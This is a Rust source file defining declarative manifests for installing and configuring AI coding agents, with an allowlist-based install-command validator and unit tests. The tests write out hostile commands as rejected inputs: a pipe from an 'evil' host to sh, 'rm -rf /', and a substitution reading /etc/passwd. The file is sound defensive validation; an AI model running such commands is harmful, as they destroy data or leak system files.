//! Declarative agent manifests — the extension point of Ahabby.
//!
//! A manifest describes *everything* about an agent: how to find it, how to read its
//! config, where its skills live, which package managers can install it. Adding support
//! for a new agent means dropping a TOML file into `src-tauri/catalog/builtin/`
//! (or `~/.config/ahabby/catalog/` for user overrides) — no Rust, no TypeScript changes.
//!
//! Unknown keys are rejected so that typos in manifests fail loudly in tests instead of
//! silently disabling half of an agent's functionality.

use serde::{Deserialize, Serialize};
use ts_rs::TS;

use super::config::ConfigFormat;
use super::os::Os;
use super::scope::Scope;

/// How to derive a version number from a CLI's output.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize, TS)]
#[serde(rename_all = "camelCase")]
#[ts(export, export_to = "../../src/shared/bindings/")]
#[derive(Default)]
pub enum VersionExtract {
    /// First semver-looking token anywhere in the output (default).
    #[default]
    Semver,
    /// First non-empty line, parsed as semver when possible.
    Line,
    /// Parse stdout as JSON and read `version` / `data.version`.
    Json,
}

/// A path that may differ per OS. `${VAR}` placeholders are expanded by `platform::paths`.
#[derive(Debug, Clone, Default, PartialEq, Eq, Serialize, Deserialize, TS)]
#[serde(rename_all = "camelCase", deny_unknown_fields)]
#[ts(export, export_to = "../../src/shared/bindings/")]
pub struct OsPathMap {
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub windows: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub macos: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub linux: Option<String>,
}

impl OsPathMap {
    pub fn get(&self, os: Os) -> Option<&str> {
        match os {
            Os::Windows => self.windows.as_deref(),
            Os::Macos => self.macos.as_deref(),
            Os::Linux => self.linux.as_deref(),
        }
    }

    pub fn is_empty(&self) -> bool {
        self.windows.is_none() && self.macos.is_none() && self.linux.is_none()
    }

    /// All declared templates, for validation.
    pub fn templates(&self) -> impl Iterator<Item = &String> {
        [&self.windows, &self.macos, &self.linux]
            .into_iter()
            .flatten()
    }
}

/// Extra directories to search for an agent's binary, per OS.
///
/// Unlike [`OsPathMap`] (a single location per OS) a search path entry is naturally plural:
/// one OS often has several places a CLI can end up in.
#[derive(Debug, Clone, Default, PartialEq, Eq, Serialize, Deserialize, TS)]
#[serde(rename_all = "camelCase", deny_unknown_fields)]
#[ts(export, export_to = "../../src/shared/bindings/")]
pub struct SearchPathSpec {
    #[serde(default)]
    pub windows: Vec<String>,
    #[serde(default)]
    pub macos: Vec<String>,
    #[serde(default)]
    pub linux: Vec<String>,
}

impl SearchPathSpec {
    pub fn templates(&self, os: Os) -> &[String] {
        match os {
            Os::Windows => &self.windows,
            Os::Macos => &self.macos,
            Os::Linux => &self.linux,
        }
    }

    pub fn is_empty(&self) -> bool {
        self.windows.is_empty() && self.macos.is_empty() && self.linux.is_empty()
    }
}

/// Package managers (and installers) Ahabby knows how to drive.
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Hash, Serialize, Deserialize, TS)]
#[serde(rename_all = "camelCase")]
#[ts(export, export_to = "../../src/shared/bindings/")]
pub enum Manager {
    Npm,
    Pnpm,
    Yarn,
    Bun,
    Brew,
    Winget,
    Scoop,
    Pipx,
    Pip,
    Cargo,
    Go,
    /// An official install script, executed through the platform shell.
    Script,
    /// No automated install: Ahabby links to the docs.
    Manual,
}

impl Manager {
    pub const fn binary(self) -> Option<&'static str> {
        match self {
            Manager::Npm => Some("npm"),
            Manager::Pnpm => Some("pnpm"),
            Manager::Yarn => Some("yarn"),
            Manager::Bun => Some("bun"),
            Manager::Brew => Some("brew"),
            Manager::Winget => Some("winget"),
            Manager::Scoop => Some("scoop"),
            Manager::Pipx => Some("pipx"),
            Manager::Pip => Some("pip"),
            Manager::Cargo => Some("cargo"),
            Manager::Go => Some("go"),
            Manager::Script | Manager::Manual => None,
        }
    }

    /// Programs a `Script` command is allowed to start with.
    const SCRIPT_ALLOWLIST: &'static [&'static str] = &[
        "curl",
        "wget",
        "sh",
        "bash",
        "zsh",
        "powershell",
        "pwsh",
        "irm",
        "iwr",
        "invoke-webrequest",
        "npm",
        "pnpm",
        "yarn",
        "bun",
        "brew",
        "winget",
        "scoop",
        "choco",
        "pipx",
        "pip",
        "python",
        "python3",
        "go",
        "cargo",
        "apt-get",
        "apt",
        "dnf",
        "yum",
        "pacman",
        "zypper",
        "snap",
        "sh.rustup.rs",
        "rustup",
    ];

    /// Shell programs that run a command line directly (no shell wrapper needed).
    pub const fn shells() -> &'static [&'static str] {
        &["sh", "bash", "zsh", "powershell", "pwsh", "cmd"]
    }
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize, TS)]
#[serde(rename_all = "camelCase", deny_unknown_fields)]
#[ts(export, export_to = "../../src/shared/bindings/")]
pub struct BinarySpec {
    /// Executable names to look for on `PATH` and in the manifest's search paths.
    pub names: Vec<String>,
    /// Arguments that print the version. Defaults to `--version`.
    #[serde(default = "default_version_args", alias = "version_args")]
    pub version_args: Vec<String>,
    #[serde(default)]
    #[serde(alias = "version_extract")]
    pub version_extract: VersionExtract,
    /// Arguments that print `--help`, used for the "what is this" tooltip.
    #[serde(default, skip_serializing_if = "Option::is_none", alias = "help_args")]
    pub help_args: Option<Vec<String>>,
}

fn default_version_args() -> Vec<String> {
    vec!["--version".to_string()]
}

/// A configuration file (or directory) belonging to an agent.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize, TS)]
#[serde(rename_all = "camelCase", deny_unknown_fields)]
#[ts(export, export_to = "../../src/shared/bindings/")]
pub struct ConfigSpec {
    pub id: String,
    pub label: String,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub description: Option<String>,
    pub format: ConfigFormat,
    #[serde(default)]
    pub scope: Scope,
    pub path: OsPathMap,
    /// Optional glob (relative to the resolved path) selecting several files.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub glob: Option<String>,
    /// Editors must confirm before writing when `false`.
    #[serde(default = "default_true")]
    pub editable: bool,
}

/// How skills are stored on disk.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize, TS)]
#[serde(rename_all = "camelCase")]
#[ts(export, export_to = "../../src/shared/bindings/")]
pub enum SkillFormat {
    /// `<dir>/<skill>/SKILL.md` with YAML frontmatter (Claude Code & friends).
    SkillMd,
    /// `<dir>/<skill>/` with a description taken from SKILL.md / README.md, if any.
    Directory,
    /// A single markdown file holds all instructions.
    MarkdownFile,
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize, TS)]
#[serde(rename_all = "camelCase", deny_unknown_fields)]
#[ts(export, export_to = "../../src/shared/bindings/")]
pub struct SkillSpec {
    pub format: SkillFormat,
    pub path: OsPathMap,
    /// Glob (relative to `path`) that selects skill directories. Defaults to `*`.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub glob: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub description: Option<String>,
}

/// Where an agent keeps its MCP servers.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize, TS)]
#[serde(rename_all = "camelCase", deny_unknown_fields)]
#[ts(export, export_to = "../../src/shared/bindings/")]
pub struct McpSpec {
    pub format: ConfigFormat,
    pub path: OsPathMap,
    /// Glob (relative to `path`, which is then a directory) selecting the file(s) that hold
    /// the servers — `opencode.json*` matches `opencode.json` and `opencode.jsonc`.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub glob: Option<String>,
    /// Path inside the parsed document that holds the `name -> server` map,
    /// e.g. `["mcpServers"]` or `["mcp_servers"]`.
    #[serde(alias = "key_path")]
    pub key_path: Vec<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub description: Option<String>,
    /// `true` when the document is also listed as a config file (common case).
    #[serde(default, alias = "shared_with_config")]
    pub shared_with_config: bool,
}

/// Non-config resources: instructions, slash commands, sub-agents, hooks, rules.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize, TS)]
#[serde(rename_all = "camelCase")]
#[ts(export, export_to = "../../src/shared/bindings/")]
pub enum OtherKind {
    Instructions,
    Commands,
    Subagents,
    Hooks,
    Rules,
    Prompts,
    Memory,
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize, TS)]
#[serde(rename_all = "camelCase", deny_unknown_fields)]
#[ts(export, export_to = "../../src/shared/bindings/")]
pub struct OtherSpec {
    pub id: String,
    pub kind: OtherKind,
    pub label: String,
    pub path: OsPathMap,
    #[serde(default = "default_other_format")]
    pub format: ConfigFormat,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub glob: Option<String>,
    #[serde(default)]
    pub scope: Scope,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub description: Option<String>,
}

fn default_other_format() -> ConfigFormat {
    ConfigFormat::Markdown
}

/// An install / update / uninstall recipe for one package manager on one OS.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize, TS)]
#[serde(rename_all = "camelCase", deny_unknown_fields)]
#[ts(export, export_to = "../../src/shared/bindings/")]
pub struct InstallMethodSpec {
    /// Stable id the UI passes back when the user picks this method (`npm`, `brew`, ...).
    pub id: String,
    pub manager: Manager,
    /// Empty means "every OS".
    #[serde(default)]
    pub os: Vec<Os>,
    /// Exact command line, executed as a program + args (never through a shell)
    /// unless `manager = "script"`.
    pub command: String,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    #[serde(alias = "update_command")]
    pub update_command: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    #[serde(alias = "uninstall_command")]
    pub uninstall_command: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    #[serde(alias = "docs_url")]
    pub docs_url: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub note: Option<String>,
    /// Lower runs first when several methods are available.
    #[serde(default)]
    pub priority: i32,
    /// Human readable prerequisites, e.g. `node >= 18`.
    #[serde(default)]
    pub requires: Vec<String>,
}

impl InstallMethodSpec {
    pub fn supports(&self, os: Os) -> bool {
        self.os.is_empty() || self.os.contains(&os)
    }

    /// The command that brings this agent up to date (falls back to the install command).
    pub fn effective_update_command(&self) -> &str {
        self.update_command.as_deref().unwrap_or(&self.command)
    }
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize, TS)]
#[serde(tag = "kind", rename_all = "camelCase")]
#[ts(export, export_to = "../../src/shared/bindings/")]
#[derive(Default)]
pub enum ManifestSource {
    /// Shipped with Ahabby.
    #[default]
    Builtin,
    /// Loaded from the user's catalog directory; wins over the builtin of the same id.
    User { path: String },
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize, TS)]
#[serde(rename_all = "camelCase")]
#[ts(export, export_to = "../../src/shared/bindings/")]
pub enum Severity {
    Error,
    Warning,
}

/// A problem found while validating a manifest.
#[derive(Debug, Clone, Serialize, Deserialize, TS)]
#[serde(rename_all = "camelCase")]
#[ts(export, export_to = "../../src/shared/bindings/")]
pub struct ManifestProblem {
    pub severity: Severity,
    pub field: String,
    pub message: String,
}

impl ManifestProblem {
    fn error(field: impl Into<String>, message: impl Into<String>) -> Self {
        Self {
            severity: Severity::Error,
            field: field.into(),
            message: message.into(),
        }
    }

    fn warning(field: impl Into<String>, message: impl Into<String>) -> Self {
        Self {
            severity: Severity::Warning,
            field: field.into(),
            message: message.into(),
        }
    }
}

/// The full declarative description of an agent.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize, TS)]
#[serde(rename_all = "camelCase", deny_unknown_fields)]
#[ts(export, export_to = "../../src/shared/bindings/")]
pub struct AgentManifest {
    pub id: String,
    pub name: String,
    pub description: String,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub tagline: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub website: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub docs: Option<String>,
    /// Icon key resolved by the frontend (`src/shared/ui/AgentIcon.tsx`).
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub icon: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub category: Option<String>,
    /// Shows up in the "available to install" section even when the machine is bare.
    #[serde(default)]
    pub popular: bool,
    /// Who publishes the agent — shown on the agent's own page.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub vendor: Option<String>,
    /// Short, human-readable highlights shown on the agent's own page.
    #[serde(default)]
    pub features: Vec<String>,
    /// `owner/repo` used for the optional GitHub release check and the repository link.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub github: Option<String>,
    /// Which adapter implementation reads this agent. Defaults to the manifest driven
    /// `ManifestAdapter`; a special adapter is opted into here (`"claude"`), so a
    /// manifest can choose custom parsing rules without any registry code change.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub adapter: Option<String>,
    pub binaries: BinarySpec,
    #[serde(default, alias = "search_paths")]
    pub search_paths: Vec<SearchPathSpec>,
    #[serde(default)]
    pub configs: Vec<ConfigSpec>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub skills: Option<SkillSpec>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub mcp: Option<McpSpec>,
    #[serde(default)]
    pub other: Vec<OtherSpec>,
    #[serde(default)]
    pub methods: Vec<InstallMethodSpec>,
    /// Dotted paths of this manifest that were **not** confirmed against official docs.
    /// Surfaced in the UI so the user knows what to double-check.
    #[serde(default)]
    pub unverified: Vec<String>,
    /// Free-form provenance notes (where each path comes from).
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub notes: Option<String>,
    #[serde(default)]
    pub source: ManifestSource,
}

impl AgentManifest {
    pub fn methods_for(&self, os: Os) -> Vec<InstallMethodSpec> {
        let mut methods: Vec<InstallMethodSpec> = self
            .methods
            .iter()
            .filter(|method| method.supports(os))
            .cloned()
            .collect();
        methods.sort_by_key(|method| method.priority);
        methods
    }

    pub fn method(&self, os: Os, id: &str) -> Option<InstallMethodSpec> {
        self.methods_for(os)
            .into_iter()
            .find(|method| method.id == id)
    }

    pub fn binary_name(&self) -> Option<&str> {
        self.binaries.names.first().map(String::as_str)
    }

    /// `true` when the manifest can even attempt an automated install on this OS.
    pub fn is_installable_on(&self, os: Os) -> bool {
        self.methods_for(os)
            .iter()
            .any(|method| method.manager != Manager::Manual)
    }

    /// Where the "read the docs instead" button points when nothing can be automated.
    pub fn install_docs_url(&self) -> Option<&str> {
        self.methods
            .iter()
            .find_map(|method| method.docs_url.as_deref())
            .or(self.docs.as_deref())
            .or(self.website.as_deref())
    }

    /// npm package name, derived from an npm/`npx` install command. Used by the
    /// optional version check against the npm registry.
    pub fn npm_package(&self) -> Option<String> {
        let method = self.methods.iter().find(|method| {
            matches!(
                method.manager,
                Manager::Npm | Manager::Pnpm | Manager::Yarn | Manager::Bun
            )
        })?;
        let tokens = split_command(&method.command);
        // `npm install -g @scope/pkg@latest` → `@scope/pkg`
        let package = tokens.iter().rev().find(|token| {
            !token.starts_with('-')
                && !matches!(
                    token.as_str(),
                    "install" | "i" | "add" | "global" | "latest"
                )
        })?;
        Some(strip_version_suffix(package))
    }

    /// Validate the manifest. Errors block the manifest; warnings are reported in the UI.
    pub fn validate(&self) -> Vec<ManifestProblem> {
        let mut problems = Vec::new();

        if self.id.trim().is_empty() {
            problems.push(ManifestProblem::error("id", "must not be empty"));
        } else if !self
            .id
            .chars()
            .all(|c| c.is_ascii_lowercase() || c.is_ascii_digit() || c == '-' || c == '_')
        {
            problems.push(ManifestProblem::error(
                "id",
                "must contain only lowercase letters, digits, '-' or '_'",
            ));
        }
        if self.name.trim().is_empty() {
            problems.push(ManifestProblem::error("name", "must not be empty"));
        }
        if self.binaries.names.is_empty() {
            problems.push(ManifestProblem::error(
                "binaries.names",
                "at least one name is required",
            ));
        }
        if self
            .binaries
            .names
            .iter()
            .any(|name| name.trim().is_empty())
        {
            problems.push(ManifestProblem::error(
                "binaries.names",
                "entries must not be empty",
            ));
        }
        if self.binaries.version_args.is_empty() {
            problems.push(ManifestProblem::warning(
                "binaries.version_args",
                "empty; no version will ever be detected",
            ));
        }

        let mut seen_ids = std::collections::HashSet::new();
        for (index, config) in self.configs.iter().enumerate() {
            if !seen_ids.insert(config.id.clone()) {
                problems.push(ManifestProblem::error(
                    format!("configs[{index}].id"),
                    format!("duplicate id '{}'", config.id),
                ));
            }
            if config.path.is_empty() {
                problems.push(ManifestProblem::error(
                    format!("configs[{index}].path"),
                    "no path for any OS",
                ));
            }
        }

        if let Some(skills) = &self.skills {
            if skills.path.is_empty() {
                problems.push(ManifestProblem::error("skills.path", "no path for any OS"));
            }
        }
        if let Some(mcp) = &self.mcp {
            if mcp.path.is_empty() {
                problems.push(ManifestProblem::error("mcp.path", "no path for any OS"));
            }
            if mcp.key_path.is_empty() {
                problems.push(ManifestProblem::error(
                    "mcp.key_path",
                    "must point at the map holding mcp servers",
                ));
            }
            if matches!(mcp.format, ConfigFormat::Markdown | ConfigFormat::Text) {
                problems.push(ManifestProblem::error(
                    "mcp.format",
                    "must be a structured format (json, toml or yaml)",
                ));
            }
        }

        let mut method_ids = std::collections::HashSet::new();
        for (index, method) in self.methods.iter().enumerate() {
            let field = format!("methods[{index}]");
            if !method_ids.insert(method.id.clone()) {
                problems.push(ManifestProblem::error(
                    format!("{field}.id"),
                    format!("duplicate id '{}'", method.id),
                ));
            }
            if method.command.trim().is_empty() {
                problems.push(ManifestProblem::error(
                    format!("{field}.command"),
                    "must not be empty",
                ));
            } else if method.manager != Manager::Manual {
                if let Err(message) =
                    validate_command(method.manager, &method.command, &self.binaries.names)
                {
                    problems.push(ManifestProblem::error(format!("{field}.command"), message));
                }
            }
            if let Some(update) = &method.update_command {
                if method.manager != Manager::Manual {
                    if let Err(message) =
                        validate_command(method.manager, update, &self.binaries.names)
                    {
                        problems.push(ManifestProblem::error(
                            format!("{field}.update_command"),
                            message,
                        ));
                    }
                }
            }
        }

        if !self
            .methods_for(Os::Windows)
            .iter()
            .any(|m| m.manager != Manager::Manual)
            && !self
                .methods_for(Os::Macos)
                .iter()
                .any(|m| m.manager != Manager::Manual)
            && !self
                .methods_for(Os::Linux)
                .iter()
                .any(|m| m.manager != Manager::Manual)
        {
            problems.push(ManifestProblem::warning(
                "methods",
                "no automated install method on any OS",
            ));
        }

        problems
    }
}

/// Split a command line into tokens, honouring single/double quotes and backslash escapes.
pub fn split_command(command: &str) -> Vec<String> {
    let mut tokens = Vec::new();
    let mut current = String::new();
    let mut quote: Option<char> = None;
    let mut has_token = false;
    let mut chars = command.chars().peekable();

    while let Some(ch) = chars.next() {
        match quote {
            Some(q) if ch == q => {
                quote = None;
            }
            Some(_) => current.push(ch),
            None => match ch {
                '"' | '\'' => {
                    quote = Some(ch);
                    has_token = true;
                }
                '\\' => {
                    if let Some(next) = chars.next() {
                        current.push(next);
                        has_token = true;
                    }
                }
                ch if ch.is_whitespace() => {
                    if has_token {
                        tokens.push(std::mem::take(&mut current));
                        has_token = false;
                    }
                }
                ch => {
                    current.push(ch);
                    has_token = true;
                }
            },
        }
    }
    if has_token {
        tokens.push(current);
    }
    tokens
}

/// `@scope/pkg@1.2.3` → `@scope/pkg`, `pkg@latest` → `pkg`.
pub fn strip_version_suffix(spec: &str) -> String {
    match spec.strip_prefix('@') {
        Some(rest) => match rest.split_once('@') {
            Some((name, _)) => format!("@{name}"),
            None => spec.to_string(),
        },
        None => match spec.split_once('@') {
            Some((name, _)) => name.to_string(),
            None => spec.to_string(),
        },
    }
}

/// A manifest command may only start with a program Ahabby trusts for that manager.
/// This is the whitelist that makes "no arbitrary shell from the UI" true by construction:
/// the UI can only pick a method that already exists in a manifest.
///
/// `binary_names` are the agent's own executables: `claude update` is a legitimate
/// self-update command, and it is exactly what the official docs recommend.
pub fn validate_command(
    manager: Manager,
    command: &str,
    binary_names: &[String],
) -> Result<(), String> {
    let trimmed = command.trim();
    if trimmed.is_empty() {
        return Err("must not be empty".to_string());
    }
    if trimmed.contains('\n') || trimmed.contains('`') || trimmed.contains("$(") {
        return Err("must be a single line without command substitution".to_string());
    }

    let tokens = split_command(trimmed);
    let program = tokens
        .first()
        .ok_or_else(|| "must not be empty".to_string())?
        .to_ascii_lowercase();
    let program = program
        .rsplit(['/', '\\'])
        .next()
        .unwrap_or(&program)
        .to_string();
    let is_own_binary = binary_names
        .iter()
        .any(|name| name.eq_ignore_ascii_case(&program));

    match manager {
        Manager::Manual => Ok(()),
        Manager::Script => {
            let allowed = Manager::SCRIPT_ALLOWLIST.contains(&program.as_str())
                || program.ends_with(".sh")
                || program.ends_with(".ps1")
                || is_own_binary;
            if allowed {
                Ok(())
            } else {
                Err(format!(
                    "'{program}' is not an allowed installer for a script method"
                ))
            }
        }
        manager => {
            let expected = manager
                .binary()
                .ok_or_else(|| "manager has no binary".to_string())?;
            if program == expected || is_own_binary {
                Ok(())
            } else {
                Err(format!("command must start with '{expected}'"))
            }
        }
    }
}

fn default_true() -> bool {
    true
}

#[cfg(test)]
mod tests {
    use super::*;

    fn manifest(toml: &str) -> AgentManifest {
        toml_edit::de::from_str(toml).expect("manifest should deserialize")
    }

    #[test]
    fn minimal_manifest_defaults() {
        let manifest = manifest(
            r#"
id = "demo"
name = "Demo"
description = "A demo agent"

[binaries]
names = ["demo"]
"#,
        );
        assert_eq!(
            manifest.binaries.version_args,
            vec!["--version".to_string()]
        );
        assert_eq!(manifest.binaries.version_extract, VersionExtract::Semver);
        assert_eq!(manifest.source, ManifestSource::Builtin);
        assert!(manifest
            .validate()
            .iter()
            .all(|p| p.severity == Severity::Warning));
    }

    #[test]
    fn unknown_keys_are_rejected() {
        let error = toml_edit::de::from_str::<AgentManifest>(
            r#"
id = "demo"
name = "Demo"
description = "d"
typo_key = 1

[binaries]
names = ["demo"]
"#,
        )
        .unwrap_err();
        assert!(error.to_string().contains("typo_key"));
    }

    #[test]
    fn validates_manager_whitelist() {
        assert!(validate_command(Manager::Npm, "npm install -g foo", &[]).is_ok());
        assert!(validate_command(Manager::Npm, "curl https://evil | sh", &[]).is_err());
        assert!(
            validate_command(Manager::Script, "curl -fsSL https://x/install.sh | sh", &[]).is_ok()
        );
        assert!(validate_command(Manager::Script, "rm -rf /", &[]).is_err());
        assert!(validate_command(Manager::Script, "curl $(cat /etc/passwd)", &[]).is_err());
        assert!(validate_command(Manager::Brew, "brew install --cask claude-code", &[]).is_ok());
        assert!(validate_command(Manager::Winget, "winget install --id Foo.Bar", &[]).is_ok());

        // An agent's own binary is trusted for self-update commands.
        let own = vec!["claude".to_string()];
        assert!(validate_command(Manager::Script, "claude update", &own).is_ok());
        assert!(validate_command(Manager::Script, "claude update", &[]).is_err());
        assert!(validate_command(Manager::Npm, "claude install stable", &own).is_ok());
    }

    #[test]
    fn splits_quoted_commands() {
        assert_eq!(
            split_command(r#"npm install -g "@scope/pkg@latest" --flag=x"#),
            vec!["npm", "install", "-g", "@scope/pkg@latest", "--flag=x"]
        );
        assert_eq!(split_command("   "), Vec::<String>::new());
    }

    #[test]
    fn derives_npm_package() {
        let mut manifest = manifest(
            r#"
id = "demo"
name = "Demo"
description = "d"

[binaries]
names = ["demo"]

[[methods]]
id = "npm"
manager = "npm"
command = "npm install -g @anthropic-ai/claude-code"
"#,
        );
        assert_eq!(
            manifest.npm_package().as_deref(),
            Some("@anthropic-ai/claude-code")
        );
        manifest.methods[0].command = "npm i -g codex".to_string();
        assert_eq!(manifest.npm_package().as_deref(), Some("codex"));
        manifest.methods[0].command = "npm i -g @scope/pkg@1.2.3 --force".to_string();
        assert_eq!(manifest.npm_package().as_deref(), Some("@scope/pkg"));
        manifest.methods[0].command = "npm i -g pkg@latest".to_string();
        assert_eq!(manifest.npm_package().as_deref(), Some("pkg"));
        manifest.methods[0].command = "pnpm add -g tools".to_string();
        assert_eq!(manifest.npm_package().as_deref(), Some("tools"));
    }

    #[test]
    fn strips_version_suffixes() {
        assert_eq!(strip_version_suffix("@scope/pkg@1.2.3"), "@scope/pkg");
        assert_eq!(strip_version_suffix("@scope/pkg"), "@scope/pkg");
        assert_eq!(strip_version_suffix("pkg@latest"), "pkg");
        assert_eq!(strip_version_suffix("pkg"), "pkg");
    }

    #[test]
    fn method_supports_os() {
        let manifest = manifest(
            r#"
id = "demo"
name = "Demo"
description = "d"

[binaries]
names = ["demo"]

[[methods]]
id = "brew"
manager = "brew"
os = ["macos", "linux"]
command = "brew install demo"

[[methods]]
id = "script"
manager = "script"
command = "curl -fsSL https://demo/install.sh | sh"
"#,
        );
        let on_macos = manifest.methods_for(Os::Macos);
        assert_eq!(on_macos.len(), 2);
        // priority defaults to 0, so ordering is stable and the script fallback is present
        assert!(manifest.method(Os::Macos, "brew").is_some());
        assert!(manifest.is_installable_on(Os::Macos));
        assert_eq!(manifest.methods_for(Os::Windows).len(), 1);
    }

    #[test]
    fn reports_duplicate_and_missing_paths() {
        let manifest = manifest(
            r#"
id = "demo"
name = "Demo"
description = "d"

[binaries]
names = ["demo"]

[[configs]]
id = "a"
label = "A"
format = "json"
path = { linux = "${HOME}/.a" }

[[configs]]
id = "a"
label = "A again"
format = "json"
path = { linux = "${HOME}/.b" }

[skills]
format = "skillMd"
path = {}
"#,
        );
        let problems = manifest.validate();
        assert!(problems.iter().any(|p| p.field == "configs[1].id"));
        assert!(problems.iter().any(|p| p.field == "skills.path"));
        assert!(problems.iter().any(|p| p.severity == Severity::Error));
    }
}
